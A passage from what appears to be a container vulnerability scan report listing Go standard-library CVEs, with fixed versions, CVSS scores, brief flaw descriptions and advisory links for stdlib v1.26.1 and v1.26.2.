│     │      │                   to avoid symlink traversal. Root.Chmod checks its target before acting and
│     │      │                   returns an error if the target is a symlink lying outside the root, so the
│     │      │                   impact is limited to cases where the target is replaced with a symlink between
│     │      │                    the check and operation. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ─ [0]: CWE-59 
│     │      ├ VendorSeverity   ╭ alma       : 3 
│     │      │                  ├ amazon     : 3 
│     │      │                  ├ bitnami    : 2 
│     │      │                  ├ nvd        : 2 
│     │      │                  ├ oracle-oval: 3 
│     │      │                  ├ redhat     : 2 
│     │      │                  ╰ rocky      : 3 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H 
│     │      │                  │         ╰ V3Score : 6.4 
│     │      │                  ├ nvd     ╭ V3Vector: CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H 
│     │      │                  │         ╰ V3Score : 6.4 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H 
│     │      │                            ╰ V3Score : 7.8 
│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:14200 
│     │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-32282 
│     │      │                  ├ [2] : https://bugzilla.redhat.com/2456336 
│     │      │                  ├ [3] : https://bugzilla.redhat.com/2456338 
│     │      │                  ├ [4] : https://bugzilla.redhat.com/2456339 
│     │      │                  ├ [5] : https://bugzilla.redhat.com/show_bug.cgi?id=2456336 
│     │      │                  ├ [6] : https://bugzilla.redhat.com/show_bug.cgi?id=2456338 
│     │      │                  ├ [7] : https://bugzilla.redhat.com/show_bug.cgi?id=2456339 
│     │      │                  ├ [8] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32280 
│     │      │                  ├ [9] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32282 
│     │      │                  ├ [10]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32283 
│     │      │                  ├ [11]: https://errata.almalinux.org/9/ALSA-2026-14200.html 
│     │      │                  ├ [12]: https://errata.rockylinux.org/RLSA-2026:11514 
│     │      │                  ├ [13]: https://go.dev/cl/763761 
│     │      │                  ├ [14]: https://go.dev/issue/78293 
│     │      │                  ├ [15]: https://groups.google.com/g/golang-announce/c/0uYbvbPZRWU 
│     │      │                  ├ [16]: https://linux.oracle.com/cve/CVE-2026-32282.html 
│     │      │                  ├ [17]: https://linux.oracle.com/errata/ELSA-2026-14200.html 
│     │      │                  ├ [18]: https://nvd.nist.gov/vuln/detail/CVE-2026-32282 
│     │      │                  ├ [19]: https://pkg.go.dev/vuln/GO-2026-4864 
│     │      │                  ╰ [20]: https://www.cve.org/CVERecord?id=CVE-2026-32282 
│     │      ├ PublishedDate   : 2026-04-08T02:16:03.467Z 
│     │      ╰ LastModifiedDate: 2026-04-16T19:15:39.4Z 
│     ├ [13] ╭ VulnerabilityID : CVE-2026-32288 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4869 
│     │      ├ PkgID           : stdlib@v1.26.1 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.1 
│     │      │                  ╰ UID : fd1b63a55787cf45 
│     │      ├ InstalledVersion: v1.26.1 
│     │      ├ FixedVersion    : 1.25.9, 1.26.2 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : nvd 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-32288 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:5d200242730ca087a9367757a2702ac07cf99d36847bbee65da96316e9f81b1c 
│     │      ├ Title           : archive/tar: golang: Go's archive/tar package: Denial of Service via
│     │      │                   maliciously-crafted archive 
│     │      ├ Description     : tar.Reader can allocate an unbounded amount of memory when reading a
│     │      │                   maliciously-crafted archive containing a large number of sparse regions
│     │      │                   encoded in the "old GNU sparse map" format. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ─ [0]: CWE-770 
│     │      ├ VendorSeverity   ╭ amazon : 3 
│     │      │                  ├ azure  : 2 
│     │      │                  ├ bitnami: 2 
│     │      │                  ├ nvd    : 2 
│     │      │                  ├ photon : 3 
│     │      │                  ╰ redhat : 2 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 5.5 
│     │      │                  ├ nvd     ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 5.5 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:L 
│     │      │                            ╰ V3Score : 4.3 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-32288 
│     │      │                  ├ [1]: https://go.dev/cl/763766 
│     │      │                  ├ [2]: https://go.dev/issue/78301 
│     │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/0uYbvbPZRWU 
│     │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-32288 
│     │      │                  ├ [5]: https://pkg.go.dev/vuln/GO-2026-4869 
│     │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-32288 
│     │      ├ PublishedDate   : 2026-04-08T02:16:03.707Z 
│     │      ╰ LastModifiedDate: 2026-04-16T19:08:52.24Z 
│     ├ [14] ╭ VulnerabilityID : CVE-2026-32289 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4865 
│     │      ├ PkgID           : stdlib@v1.26.1 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.1 
│     │      │                  ╰ UID : fd1b63a55787cf45 
│     │      ├ InstalledVersion: v1.26.1 
│     │      ├ FixedVersion    : 1.25.9, 1.26.2 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : nvd 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-32289 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:16a05831230279969200ae65333ee4c8f723ed23b06cfc85a3f17546571f6c6d 
│     │      ├ Title           : html/template: golang: html/template: Cross-Site Scripting (XSS) via improper
│     │      │                   context and brace depth tracking in JS template literals 
│     │      ├ Description     : Context was not properly tracked across template branches for JS template
│     │      │                   literals, leading to possibly incorrect escaping of content when branches were
│     │      │                    used. Additionally template actions within JS template literals did not
│     │      │                   properly track the brace depth, leading to incorrect escaping being applied.
│     │      │                   These issues could cause actions within JS template literals to be incorrectly
│     │      │                    or improperly escaped, leading to XSS vulnerabilities. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ─ [0]: CWE-79 
│     │      ├ VendorSeverity   ╭ amazon : 3 
│     │      │                  ├ bitnami: 2 
│     │      │                  ├ nvd    : 2 
│     │      │                  ├ photon : 4 
│     │      │                  ╰ redhat : 2 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N 
│     │      │                  │         ╰ V3Score : 6.1 
│     │      │                  ├ nvd     ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N 
│     │      │                  │         ╰ V3Score : 6.1 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N 
│     │      │                            ╰ V3Score : 5.4 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-32289 
│     │      │                  ├ [1]: https://go.dev/cl/763762 
│     │      │                  ├ [2]: https://go.dev/issue/78331 
│     │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/0uYbvbPZRWU 
│     │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-32289 
│     │      │                  ├ [5]: https://pkg.go.dev/vuln/GO-2026-4865 
│     │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-32289 
│     │      ├ PublishedDate   : 2026-04-08T02:16:03.82Z 
│     │      ╰ LastModifiedDate: 2026-04-16T19:06:57.367Z 
│     ├ [15] ╭ VulnerabilityID : CVE-2026-33811 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4981 
│     │      ├ PkgID           : stdlib@v1.26.1 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.1 
│     │      │                  ╰ UID : fd1b63a55787cf45 
│     │      ├ InstalledVersion: v1.26.1 
│     │      ├ FixedVersion    : 1.25.10, 1.26.3 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-33811 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:6b9c35366a5bf50c6fe78dc9d332f4a200c6bd6128524ddf92e5039d82180e14 
│     │      ├ Title           : When using LookupCNAME with the cgo DNS resolver, a very long CNAME re ... 
│     │      ├ Description     : When using LookupCNAME with the cgo DNS resolver, a very long CNAME response
│     │      │                   can trigger a double-free of C memory and a crash. 
│     │      ├ Severity        : UNKNOWN 
│     │      ├ References       ╭ [0]: https://go.dev/cl/767860 
│     │      │                  ├ [1]: https://go.dev/issue/78803 
│     │      │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │      │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4981 
│     │      ├ PublishedDate   : 2026-05-07T20:16:42.77Z 
│     │      ╰ LastModifiedDate: 2026-05-08T15:16:36.64Z 
│     ├ [16] ╭ VulnerabilityID : CVE-2026-33814 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4918 
│     │      ├ PkgID           : stdlib@v1.26.1 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.1 
│     │      │                  ╰ UID : fd1b63a55787cf45 
│     │      ├ InstalledVersion: v1.26.1 
│     │      ├ FixedVersion    : 1.25.10, 1.26.3 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-33814 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:27cfcb79b2219732344a2b768e56a4e4b4143abbad6ff6e04b36bc5d4278809c 
│     │      ├ Title           : When processing HTTP/2 SETTINGS frames, transport will enter an infini ... 
│     │      ├ Description     : When processing HTTP/2 SETTINGS frames, transport will enter an infinite loop
│     │      │                   of writing CONTINUATION frames if it receives a SETTINGS_MAX_FRAME_SIZE with a
│     │      │                    value of 0. 
│     │      ├ Severity        : UNKNOWN 
│     │      ├ References       ╭ [0]: https://go.dev/cl/761581 
│     │      │                  ├ [1]: https://go.dev/cl/761640 
│     │      │                  ├ [2]: https://go.dev/issue/78476 
│     │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │      │                  ╰ [4]: https://pkg.go.dev/vuln/GO-2026-4918 
│     │      ├ PublishedDate   : 2026-05-07T20:16:42.88Z 
│     │      ╰ LastModifiedDate: 2026-05-08T19:16:30.567Z 
│     ├ [17] ╭ VulnerabilityID : CVE-2026-39820 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4986 
│     │      ├ PkgID           : stdlib@v1.26.1 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.1 
│     │      │                  ╰ UID : fd1b63a55787cf45 
│     │      ├ InstalledVersion: v1.26.1 
│     │      ├ FixedVersion    : 1.25.10, 1.26.3 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39820 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:d44593ca556d44b70b3089d1e15f40a41c5c4ff1494d531c27b6c0bf98154ad0 
│     │      ├ Title           : Well-crafted inputs reaching ParseAddress, ParseAddressList, and Parse ... 
│     │      ├ Description     : Well-crafted inputs reaching ParseAddress, ParseAddressList, and ParseDate
│     │      │                   were able to trigger excessive CPU exhaustion and memory allocations. 
│     │      ├ Severity        : UNKNOWN 
│     │      ├ References       ╭ [0]: https://go.dev/cl/759940 
│     │      │                  ├ [1]: https://go.dev/issue/78566 
│     │      │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │      │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4986 
│     │      ├ PublishedDate   : 2026-05-07T20:16:43.187Z 
│     │      ╰ LastModifiedDate: 2026-05-08T15:16:37.323Z 
│     ├ [18] ╭ VulnerabilityID : CVE-2026-39823 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4982 
│     │      ├ PkgID           : stdlib@v1.26.1 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.1 
│     │      │                  ╰ UID : fd1b63a55787cf45 
│     │      ├ InstalledVersion: v1.26.1 
│     │      ├ FixedVersion    : 1.25.10, 1.26.3 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39823 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:37de0a44509df5873b2d1bd52fc123295fa5ae2eeb05133e0641c316e8c012fb 
│     │      ├ Title           : CVE-2026-27142 fixed a vulnerability in which URLs were not correctly  ... 
│     │      ├ Description     : CVE-2026-27142 fixed a vulnerability in which URLs were not correctly escaped
│     │      │                   inside of a <meta> tag's <content> attribute. If the URL content were to
│     │      │                   insert ASCII whitespaces around the '=' rune inside of the <content>
│     │      │                   attribute, the escaper would fail to similarly escape it, leading to XSS. 
│     │      ├ Severity        : UNKNOWN 
│     │      ├ References       ╭ [0]: https://go.dev/cl/769920 
│     │      │                  ├ [1]: https://go.dev/issue/78913 
│     │      │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │      │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4982 
│     │      ├ PublishedDate   : 2026-05-07T20:16:43.29Z 
│     │      ╰ LastModifiedDate: 2026-05-08T15:16:37.5Z 
│     ├ [19] ╭ VulnerabilityID : CVE-2026-39825 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4976 
│     │      ├ PkgID           : stdlib@v1.26.1 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.1 
│     │      │                  ╰ UID : fd1b63a55787cf45 
│     │      ├ InstalledVersion: v1.26.1 
│     │      ├ FixedVersion    : 1.25.10, 1.26.3 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39825 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:c2e1d402d028041d5274bad5a963ab5b850dca3410efdb5b3fcc833d31722dfb 
│     │      ├ Title           : ReverseProxy can forward queries containing parameters not visible to  ... 
│     │      ├ Description     : ReverseProxy can forward queries containing parameters not visible to Rewrite
│     │      │                   functions. When used with a Rewrite function, or a Director function which
│     │      │                   parses query parameters, ReverseProxy sanitizes the forwarded request to
│     │      │                   remove query parameters which are not parsed by url.ParseQuery. ReverseProxy
│     │      │                   does not take ParseQuery's limit on the total number of query parameters
│     │      │                   (controlled by GODEBUG=urlmaxqueryparams=N) into account. This can permit
│     │      │                   ReverseProxy to forward a request containing a query parameter that is not
│     │      │                   visible to the Rewrite function. For example, the query
│     │      │                   "a1=x&a2=x&...&a10000=x&hidden=y" can forward the parameter "hidden=y" while
│     │      │                   hiding it from the proxy's Rewrite function. 
│     │      ├ Severity        : UNKNOWN 
│     │      ├ References       ╭ [0]: https://go.dev/cl/770541 
│     │      │                  ├ [1]: https://go.dev/issue/78948 
│     │      │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │      │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4976 
│     │      ├ PublishedDate   : 2026-05-07T20:16:43.39Z 
│     │      ╰ LastModifiedDate: 2026-05-08T22:16:29.547Z 
│     ├ [20] ╭ VulnerabilityID : CVE-2026-39826 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4980 
│     │      ├ PkgID           : stdlib@v1.26.1 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.1 
│     │      │                  ╰ UID : fd1b63a55787cf45 
│     │      ├ InstalledVersion: v1.26.1 
│     │      ├ FixedVersion    : 1.25.10, 1.26.3 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39826 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:5c63ff81384a08d7d7bad7f6456d46876f28c133f53178b4fefe341235fbdd8b 
│     │      ├ Title           : If a trusted template author were to write a <script> tag containing a ... 
│     │      ├ Description     : If a trusted template author were to write a <script> tag containing an empty
│     │      │                   'type' attribute or a 'type' attribute with an ASCII whitespace, the execution
│     │      │                    of the template would incorrectly escape any data passed into the <script>
│     │      │                   block. 
│     │      ├ Severity        : UNKNOWN 
│     │      ├ References       ╭ [0]: https://go.dev/cl/771180 
│     │      │                  ├ [1]: https://go.dev/issue/78981 
│     │      │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │      │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4980 
│     │      ├ PublishedDate   : 2026-05-07T20:16:43.49Z 
│     │      ╰ LastModifiedDate: 2026-05-08T15:16:37.68Z 
│     ├ [21] ╭ VulnerabilityID : CVE-2026-39836 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4971 
│     │      ├ PkgID           : stdlib@v1.26.1 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.1 
│     │      │                  ╰ UID : fd1b63a55787cf45 
│     │      ├ InstalledVersion: v1.26.1 
│     │      ├ FixedVersion    : 1.25.10, 1.26.3 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39836 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:b2f18874fc475e70372b93b91b80baf916cf2998da880d733e112b59c22f43a1 
│     │      ├ Title           : Panic in Dial and LookupPort when handling NUL byte on Windows in net 
│     │      ├ Description     : The Dial and LookupPort functions panic on Windows when provided with an input
│     │      │                    containing a NUL (0). 
│     │      ├ Severity        : UNKNOWN 
│     │      ├ References       ╭ [0]: https://go.dev/cl/775320 
│     │      │                  ├ [1]: https://go.dev/issue/79006 
│     │      │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │      │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4971 
│     │      ├ PublishedDate   : 2026-05-07T20:16:43.593Z 
│     │      ╰ LastModifiedDate: 2026-05-08T22:16:29.723Z 
│     ╰ [22] ╭ VulnerabilityID : CVE-2026-42499 
│            ├ VendorIDs        ─ [0]: GO-2026-4977 
│            ├ PkgID           : stdlib@v1.26.1 
│            ├ PkgName         : stdlib 
│            ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.1 
│            │                  ╰ UID : fd1b63a55787cf45 
│            ├ InstalledVersion: v1.26.1 
│            ├ FixedVersion    : 1.25.10, 1.26.3 
│            ├ Status          : fixed 
│            ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│            │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│            ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42499 
│            ├ DataSource       ╭ ID  : govulndb 
│            │                  ├ Name: The Go Vulnerability Database 
│            │                  ╰ URL : https://pkg.go.dev/vuln/ 
│            ├ Fingerprint     : sha256:ab42b6fb18a6c97e665be9de73240336be5e7a153a2ffb4cecacb5e513649816 
│            ├ Title           : Pathological inputs could cause DoS through consumePhrase when parsing ... 
│            ├ Description     : Pathological inputs could cause DoS through consumePhrase when parsing an
│            │                   email address according to RFC 5322. 
│            ├ Severity        : UNKNOWN 
│            ├ References       ╭ [0]: https://go.dev/cl/771520 
│            │                  ├ [1]: https://go.dev/issue/78987 
│            │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│            │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4977 
│            ├ PublishedDate   : 2026-05-07T20:16:44.54Z 
│            ╰ LastModifiedDate: 2026-05-08T22:16:33.183Z 
├ [2] ╭ [0] ╭ VulnerabilityID : CVE-2026-33811 
│     │     ├ VendorIDs        ─ [0]: GO-2026-4981 
│     │     ├ PkgID           : stdlib@v1.26.2 
│     │     ├ PkgName         : stdlib 
│     │     ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.2 
│     │     │                  ╰ UID : 2cce5456b87d81aa 
│     │     ├ InstalledVersion: v1.26.2 
│     │     ├ FixedVersion    : 1.25.10, 1.26.3 
│     │     ├ Status          : fixed 
│     │     ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │     │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-33811 
│     │     ├ DataSource       ╭ ID  : govulndb 
│     │     │                  ├ Name: The Go Vulnerability Database 
│     │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │     ├ Fingerprint     : sha256:c98462b919be62647f7bfbea9ebdd7902c2a9c9c14cbbb26741409ae1791ee31 
│     │     ├ Title           : When using LookupCNAME with the cgo DNS resolver, a very long CNAME re ... 
│     │     ├ Description     : When using LookupCNAME with the cgo DNS resolver, a very long CNAME response
│     │     │                   can trigger a double-free of C memory and a crash. 
│     │     ├ Severity        : UNKNOWN 
│     │     ├ References       ╭ [0]: https://go.dev/cl/767860 
│     │     │                  ├ [1]: https://go.dev/issue/78803 
│     │     │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │     │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4981 
│     │     ├ PublishedDate   : 2026-05-07T20:16:42.77Z 
│     │     ╰ LastModifiedDate: 2026-05-08T15:16:36.64Z 
│     ├ [1] ╭ VulnerabilityID : CVE-2026-33814 
│     │     ├ VendorIDs        ─ [0]: GO-2026-4918 
│     │     ├ PkgID           : stdlib@v1.26.2 
│     │     ├ PkgName         : stdlib 
│     │     ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.2 
│     │     │                  ╰ UID : 2cce5456b87d81aa 
│     │     ├ InstalledVersion: v1.26.2 
│     │     ├ FixedVersion    : 1.25.10, 1.26.3 
│     │     ├ Status          : fixed 
│     │     ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │     │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-33814 
│     │     ├ DataSource       ╭ ID  : govulndb 
│     │     │                  ├ Name: The Go Vulnerability Database 
│     │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │     ├ Fingerprint     : sha256:94e9d542bc0f837f92b1503a3f4636ab55481c2e17bd066a92f032c37aa059e6 
│     │     ├ Title           : When processing HTTP/2 SETTINGS frames, transport will enter an infini ... 
│     │     ├ Description     : When processing HTTP/2 SETTINGS frames, transport will enter an infinite loop
│     │     │                   of writing CONTINUATION frames if it receives a SETTINGS_MAX_FRAME_SIZE with a
│     │     │                   value of 0. 
│     │     ├ Severity        : UNKNOWN 
│     │     ├ References       ╭ [0]: https://go.dev/cl/761581 
│     │     │                  ├ [1]: https://go.dev/cl/761640 
│     │     │                  ├ [2]: https://go.dev/issue/78476 
│     │     │                  ├ [3]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │     │                  ╰ [4]: https://pkg.go.dev/vuln/GO-2026-4918 
│     │     ├ PublishedDate   : 2026-05-07T20:16:42.88Z 
│     │     ╰ LastModifiedDate: 2026-05-08T19:16:30.567Z 
│     ├ [2] ╭ VulnerabilityID : CVE-2026-39820 
│     │     ├ VendorIDs        ─ [0]: GO-2026-4986 
│     │     ├ PkgID           : stdlib@v1.26.2 
│     │     ├ PkgName         : stdlib 
│     │     ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.2 
│     │     │                  ╰ UID : 2cce5456b87d81aa 
│     │     ├ InstalledVersion: v1.26.2 
│     │     ├ FixedVersion    : 1.25.10, 1.26.3 
│     │     ├ Status          : fixed 
│     │     ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │     │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39820 
│     │     ├ DataSource       ╭ ID  : govulndb 
│     │     │                  ├ Name: The Go Vulnerability Database 
│     │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │     ├ Fingerprint     : sha256:b3fa6e658bdbc31a4b9592eecc08055168b4655bfdecf9729b6d3274a24f8da9 
│     │     ├ Title           : Well-crafted inputs reaching ParseAddress, ParseAddressList, and Parse ... 
│     │     ├ Description     : Well-crafted inputs reaching ParseAddress, ParseAddressList, and ParseDate were
│     │     │                    able to trigger excessive CPU exhaustion and memory allocations. 
│     │     ├ Severity        : UNKNOWN 
│     │     ├ References       ╭ [0]: https://go.dev/cl/759940 
│     │     │                  ├ [1]: https://go.dev/issue/78566 
